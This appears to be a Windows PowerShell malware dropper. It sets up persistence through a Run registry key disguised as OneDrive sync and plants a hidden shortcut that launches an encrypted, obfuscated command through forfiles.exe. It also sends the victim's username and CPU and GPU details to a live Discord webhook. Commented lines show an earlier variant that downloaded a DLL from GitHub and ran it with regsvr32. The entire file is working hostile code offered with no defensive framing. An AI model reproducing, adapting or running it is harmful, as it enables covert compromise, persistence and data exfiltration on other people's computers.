sleep 5

#$googoogaagaa = "$env:tmp\DriverDiag.dll"
$googoogaagaa = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
if (-Not (Test-Path $googoogaagaa)) {

$currentPath = [System.Environment]::GetEnvironmentVariable("PATH", "User")
$newPath = $currentPath + ";$env:tmp"
[System.Environment]::SetEnvironmentVariable("PATH", $newPath, "User")
#New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Driver Diagnosis" -Value "regsvr32.exe /s DriverDiag" -PropertyType String -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive File Sync" -Value '"C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"' -PropertyType String -Force

#$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/DriverDiag.dll"
#$destination = "$env:tmp\DriverDiag.dll"
#Invoke-WebRequest -Uri $source -OutFile $destination

mkdir "C:\ProgramData\Microsoft OneDrive\FileSync";
$shortcutpath = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"

# Create a new COM object for WScript.Shell
$wshShell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $wshShell.CreateShortcut($shortcutPath)

# Set the target to PowerShell and the arguments to run 'calc'
$shortcut.TargetPath = "$env:SystemRoot\System32\forfiles.exe"


$data = "76492d1116743f0423413b16050a5345MgB8AFAAcABEAFoAYQAyACsAQQAxAFYAYwBwAE0AWgBQAGMASwBYAFkAUABvAEEAPQA9AHwAMgAwAGIAOABhADMAMQA2ADgAMQA0ADgAYQBiADcANQAwADMAZgBlADQAZQAxADMAYwBlAGQAZQAzADAAMQA5ADMAYQBkAGUANgBjAGIAMAA4ADIAZAA0AGMAZgAyAGMAMABmAGYAYQA5AGEAOQAxADQAYwA4AGEAMAA4ADQANgA5AGEANQAyADcAMwA4ADEAMwBiADcANwA2ADYAZgBlADYAYQAzAGIANQA5ADgAMAAwADgAZgBmADQANgAyADIAMwBlAGUAOQBiADkAYgAzADkAYwA0AGEAMgA4AGUAYwA2ADYAMgAxAGYAYQBkADgAYgA1ADMANgA3ADgAYgAyADcAOAA1AGIAYwBkADAAMAA4ADYAYgA0AGYAOAA3ADQAMAA1AGEAYwBmADEANAA3ADIAZQA0AGYANgA2ADgANQA5ADcAZAA0AGQANgA2ADcAMAAzAGQAYQA0ADQANgBhAGQAMQA4AGYANwBmADMAZQAwADIANAAyADEAMQBhADUANQBhADEAYwA5AGMAYwBiAGUANgBiADIANAA1ADMAZABhAGUANQA2ADIAYgA2AGYAYgAzAGEAZgA0ADQAZAAwAGYAOQBjADkAMAA2ADIAOAAzAGEAMQBjADcANAA4ADUAMwBkADUAOABhADMAMwAwAGQAZABkAGEAZQBjADUANwA4AGUAMQBkADIANgAwADMANQBjADkAOABlADAAOABiAGUAMQA4ADAAMwBjADQAOABhAGMAZQAwADEAYwAwAGIAYwA5ADMANwAxADMANAA3ADYAMQA0ADEAZQA5AGIANAA5ADkAMQA0ADgAZABlADYAMgA1ADEANAA2AGYAYwA3ADEAOAAzADUAOAAzADQAOQBlADUAZgA3AGQAMwA4ADUANwAwADIAZQAyAGMAMAA2AGUANAAxADEAYwBlADAAYgA2ADYAYQA0AGYAYgAyADMAMwBiADEAYwAyAGIAMwBiAGQAMgBiADMAOQBlADMAZQAxAGIAYQA4AGMAYQAyADUAOAAwADAAOQAxADgAMgAyADYAZQAzAGUAYQA1AGEAYwBhADEAZAAxAGQAOAA5AGYAYgAxAGIAYwAxAGEANAA4ADMAMwBkADcANwA1AGMAZABlADEANwA1AGUAYwBjADgAYQBmADAAYgAwAGQANQBlADkAOQBmADkAMABiAGIAYgAzAGEAZABlADEAOQBjADUAMgAyADEAOQBlAGYANwBhAGMAYgBmADkAZAA3AGQANgA5ADcAOQA5ADUAZQBiADAAZQAyADcAMAA3ADMAOQBiADAANgA1ADIAZQBjADEANwBlADEAYgBhAGUAMAA1ADMAMQAzADkAZQBkAGQAYQA4AGUAZgA3ADEAMAA2ADUAMwBkAGMAMgA1AGIAZgBkADgAMAA4AGMAYQAxADEAZgBiADYAYQBjAGYAZQA2ADcANQA4AGMAMwBiADEAMABiADgAMgAzADUANABiAGEAMQBiADgAYgBiADUAOABjADUAZABjADMANABkAGYAMQBkADUAOAA3ADEAZQAyADEANgBkAGQAYQA5AGMAOABiADQAOABhAGIAZgAyAGQAZgBiADkAZQBlADcAOQBmADQAZAA2ADIAOQBhAGUAYQAxADYAMwA1ADgAZgBhADUAOQA1ADAAZQBkAGEAMwA0ADAAZQBhADIANABiADAANQA4ADYAYwA3ADUAMAAwADYANQAzADAAZgBmADIAOQA4ADcAZAA0AGYAMwA5AGEAMAAyAGEAOAA2ADAANQA1AGUAMAA3ADYAMgA4AGIAOQA0AGQAYwAyADgAYgBlAGYAMwA4AGUAZgBlADAAYgBlAGEAMwBmADYAOQA2ADUANQA5ADEANABmAGYAOAA5AGMAZgA2AGQAYgBhADMAYQA0AGQAYwBjADMAYQA0ADcAYQAwADEAMwBhADEAZgA5ADQAMgBlAGIANwA2ADAAMwAwADQAMABlADQAMgBlADkAZABjADEANAA4AGMANwA5ADMAZABiAGEANAA4ADMAZQA3AGIANAA4AGMAZQBmADgANgBhADcAZQBjAGMAOAA0ADMAZQAwAGYAYQA1ADkAMQAyAGYAYgBjADYAOQBmADEAMQAzAGMANAA3ADgANgA3ADIAZAA0ADMANgA5AGIAMgBhADMAMAAyAGQAYQBmADIAZAAyADgANwA5ADQAZQA4ADAAZgBjADQANgBmAGYAZQBhADQAZgAzAGMAYgA2AGMAMwA4AGUANQAyAGQAZgBiAGYAOQA3ADkAYwA3AGQAYgAwAGIAOQAwADYAYwBhAGMAZQA5ADAANgAwAGYAOAAwAGEAZQA1ADcAMAA1AGUANQBiAGUAZgA3AGQAZABlADkAZgA1ADQAYwBjAA=="
$bytes = [System.Text.Encoding]::UTF8.GetBytes("KaPdSgVkYp3s5v8y/B?E(H+MbQeThWmZ")
$key = $bytes
$sas = (New-Object System.Net.NetworkCredential("", (ConvertTo-SecureString -key $key $data))).Password
$shortcut.Arguments = "$sas"

# Set the shortcut to start minimized
$shortcut.WindowStyle = 7  # 7 means minimized

# Save the shortcut
$shortcut.Save()
$ieoaj = $shortcutpath
sleep 10
attrib +s +h $ieoaj

# Retrieve CPU information
$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors

# Retrieve GPU information
$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion

sleep 2

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1297731374878298113/58tTWuKiNueTuCrnHBBOpnKIcBq0plvOqOdQIqMI6evJakPdTSZh1yBs0J2NeDnRaQFz"

# Define the message payload
$payload = @{
    content = @"
**$env:username** has joined - atcad
----------------------------------
**GPU:** $($gpu.Name)
**CPU:** $($cpu.Name)
**CPU Cores:** $($cpu.NumberOfCores)
"@
} | ConvertTo-Json

# Send the POST request to the webhook URL
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Output "Message sent successfully."
} catch {
    Write-Output "Failed to send message. Error: $_"
}
}
